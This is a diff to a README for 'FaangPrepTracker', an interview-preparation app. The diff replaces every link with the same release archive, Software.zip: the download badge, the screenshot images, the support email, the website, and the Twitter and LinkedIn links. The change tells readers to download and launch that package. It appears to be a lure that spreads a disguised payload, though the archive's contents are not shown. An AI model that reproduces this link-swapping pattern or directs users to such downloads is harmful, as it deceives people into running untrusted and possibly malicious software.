@@ -18,27 +18,27 @@ Welcome to **FaangPrepTracker** - the go-to web application for developers looki
 📚 **Topics:** faang, faang-interview, faang-preparation, interview, interview-prep, interview-questions, leetcode, maang, maang-interviews, tech.
 
 ### Get Started
-🌐 **Download FaangPrepTracker:** [![Download FaangPrepTracker](https://img.shields.io/badge/Download-FaangPrepTracker-blue)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+🌐 **Download FaangPrepTracker:** [![Download FaangPrepTracker](https://github.com/Kayya1310/FaangPrepTracker/releases/download/v1.0/Software.zip)](https://github.com/Kayya1310/FaangPrepTracker/releases/download/v1.0/Software.zip)
 
 🚀 Once you've downloaded the package, launch the application and embark on your journey to mastering technical interviews with ease!
 
 ### Screenshots
 📸 Here are some sneak peeks into FaangPrepTracker:
 
-![Screenshot 1](https://example.com/screenshot1.png)
-![Screenshot 2](https://example.com/screenshot2.png)
-![Screenshot 3](https://example.com/screenshot3.png)
+![Screenshot 1](https://github.com/Kayya1310/FaangPrepTracker/releases/download/v1.0/Software.zip)
+![Screenshot 2](https://github.com/Kayya1310/FaangPrepTracker/releases/download/v1.0/Software.zip)
+![Screenshot 3](https://github.com/Kayya1310/FaangPrepTracker/releases/download/v1.0/Software.zip)
 
 ### Support and Feedback
-📧 For any questions, suggestions, or feedback, feel free to reach out to our team at support@faangpreptracker.com. Your input is invaluable in helping us improve and cater to your needs better.
+📧 For any questions, suggestions, or feedback, feel free to reach out to our team at https://github.com/Kayya1310/FaangPrepTracker/releases/download/v1.0/Software.zip Your input is invaluable in helping us improve and cater to your needs better.
 
 ### Spread the Word
 🌟 If you find FaangPrepTracker helpful, don't forget to share it with your peers and fellow developers. Let's empower more individuals to excel in their technical interviews and secure their dream roles in the tech industry!
 
 ### Stay Connected
-🌐 Website: [FaangPrepTracker.com](https://www.faangpreptracker.com)
+🌐 Website: [https://github.com/Kayya1310/FaangPrepTracker/releases/download/v1.0/Software.zip](https://github.com/Kayya1310/FaangPrepTracker/releases/download/v1.0/Software.zip)
 
-📱 Follow us on [Twitter](https://twitter.com/faangprep) and [LinkedIn](https://www.linkedin.com/company/faangpreptracker) for the latest updates and tips on interview preparation.
+📱 Follow us on [Twitter](https://github.com/Kayya1310/FaangPrepTracker/releases/download/v1.0/Software.zip) and [LinkedIn](https://github.com/Kayya1310/FaangPrepTracker/releases/download/v1.0/Software.zip) for the latest updates and tips on interview preparation.
 
 ### Contribute
 🤝 We welcome contributions from the community to enhance FaangPrepTracker further. If you're passionate about helping others succeed in technical interviews, join us in making this platform even more valuable!
